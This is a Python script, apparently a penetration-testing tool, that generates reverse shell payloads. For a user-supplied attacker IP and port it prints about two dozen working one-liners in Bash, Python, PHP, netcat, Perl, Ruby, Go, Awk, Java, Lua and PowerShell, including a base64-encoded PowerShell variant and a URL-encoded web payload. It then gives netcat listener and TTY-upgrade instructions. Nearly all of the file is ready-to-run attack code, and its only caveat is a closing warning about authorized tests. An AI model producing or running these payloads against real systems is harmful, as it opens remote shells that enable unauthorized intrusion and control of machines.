#!/usr/bin/env python3

"""
Reverse Shell Generator
Author: Alper Kurtulus (TheJker)
Description: Multi-language reverse shell payload generator
Usage: python3 revshell_generator.py
"""

import base64
import sys
from urllib.parse import quote

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    """Print the script banner"""
    print(f"{Colors.CYAN}")
    print("╔════════════════════════════════════════════════╗")
    print("║      Reverse Shell Payload Generator          ║")
    print("║           Author: TheJker                      ║")
    print("╚════════════════════════════════════════════════╝")
    print(f"{Colors.ENDC}")

def get_shells(lhost, lport):
    """Generate reverse shell payloads for various languages"""
    
    shells = {
        "Bash TCP": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        
        "Bash UDP": f"sh -i >& /dev/udp/{lhost}/{lport} 0>&1",
        
        "Bash 196": f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
        
        "Bash read line": f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done",
        
        "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        
        "Python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
        
        "Python3 Short": f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
        
        "PHP cmd": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        
        "PHP exec": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
        
        "PHP system": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
        
        "PHP passthru": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'",
        
        "PHP popen": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'",
        
        "Netcat mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        
        "Netcat -e": f"nc -e /bin/sh {lhost} {lport}",
        
        "Netcat -c": f"nc -c /bin/sh {lhost} {lport}",
        
        "Netcat BusyBox": f"rm -f /tmp/f; mknod /tmp/f p && nc {lhost} {lport} 0</tmp/f | /bin/sh >/tmp/f 2>&1",
        
        "Perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        
        "Perl no sh": f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{lhost}:{lport}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        
        "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        
        "Ruby no sh": f"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{lhost}\",\"{lport}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        
        "Golang": f"""echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""",
        
        "Awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
        
        "Java": f"""r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor();""",
        
        "Lua": f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');" """,
    }
    
    # PowerShell payload
    ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    
    ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
    
    shells["PowerShell"] = ps_cmd
    shells["PowerShell Base64"] = f"powershell -e {ps_b64}"
    
    return shells

def print_listener_info(lport):
    """Print listener setup instructions"""
    print(f"\n{Colors.YELLOW}═══ Listener Setup ═══{Colors.ENDC}")
    print(f"{Colors.GREEN}Run this command on your attacking machine:{Colors.ENDC}")
    print(f"{Colors.CYAN}nc -lvnp {lport}{Colors.ENDC}")
    print(f"\n{Colors.YELLOW}Or use this for a better shell:{Colors.ENDC}")
    print(f"{Colors.CYAN}rlwrap nc -lvnp {lport}{Colors.ENDC}")
    print(f"\n{Colors.YELLOW}For a fully interactive TTY:{Colors.ENDC}")
    print(f"{Colors.GREEN}1. On reverse shell:{Colors.ENDC} {Colors.CYAN}python3 -c 'import pty; pty.spawn(\"/bin/bash\")'{Colors.ENDC}")
    print(f"{Colors.GREEN}2. Press:{Colors.ENDC} {Colors.CYAN}Ctrl+Z{Colors.ENDC}")
    print(f"{Colors.GREEN}3. On attacker:{Colors.ENDC} {Colors.CYAN}stty raw -echo; fg{Colors.ENDC}")
    print(f"{Colors.GREEN}4. On reverse shell:{Colors.ENDC} {Colors.CYAN}export TERM=xterm{Colors.ENDC}")
    print()

def main():
    """Main function"""
    print_banner()
    
    # Get user input
    try:
        lhost = input(f"{Colors.YELLOW}Enter your IP address (LHOST): {Colors.ENDC}").strip()
        if not lhost:
            print(f"{Colors.RED}[!] Error: IP address is required{Colors.ENDC}")
            sys.exit(1)
        
        lport = input(f"{Colors.YELLOW}Enter listening port (LPORT) [4444]: {Colors.ENDC}").strip()
        if not lport:
            lport = "4444"
        
        # Validate port
        try:
            port_int = int(lport)
            if port_int < 1 or port_int > 65535:
                print(f"{Colors.RED}[!] Error: Port must be between 1 and 65535{Colors.ENDC}")
                sys.exit(1)
        except ValueError:
            print(f"{Colors.RED}[!] Error: Invalid port number{Colors.ENDC}")
            sys.exit(1)
        
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrupted by user{Colors.ENDC}")
        sys.exit(0)
    
    # Generate shells
    shells = get_shells(lhost, lport)
    
    print(f"\n{Colors.GREEN}[+] Generated {len(shells)} reverse shell payloads for {lhost}:{lport}{Colors.ENDC}\n")
    
    # Display shells
    for name, payload in shells.items():
        print(f"{Colors.BOLD}{Colors.BLUE}{'═' * 60}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.CYAN}[{name}]{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'═' * 60}{Colors.ENDC}")
        print(f"{Colors.GREEN}{payload}{Colors.ENDC}")
        print()
    
    # Print listener info
    print_listener_info(lport)
    
    # URL encoded version
    print(f"{Colors.YELLOW}═══ URL Encoded (for web payloads) ═══{Colors.ENDC}")
    sample_payload = shells["Bash TCP"]
    encoded = quote(sample_payload)
    print(f"{Colors.GREEN}{encoded}{Colors.ENDC}\n")
    
    # Warning
    print(f"{Colors.RED}{Colors.BOLD}⚠ WARNING ⚠{Colors.ENDC}")
    print(f"{Colors.RED}These payloads should only be used in authorized penetration tests!{Colors.ENDC}")
    print(f"{Colors.RED}Unauthorized access to computer systems is illegal.{Colors.ENDC}\n")

if __name__ == "__main__":
    main()
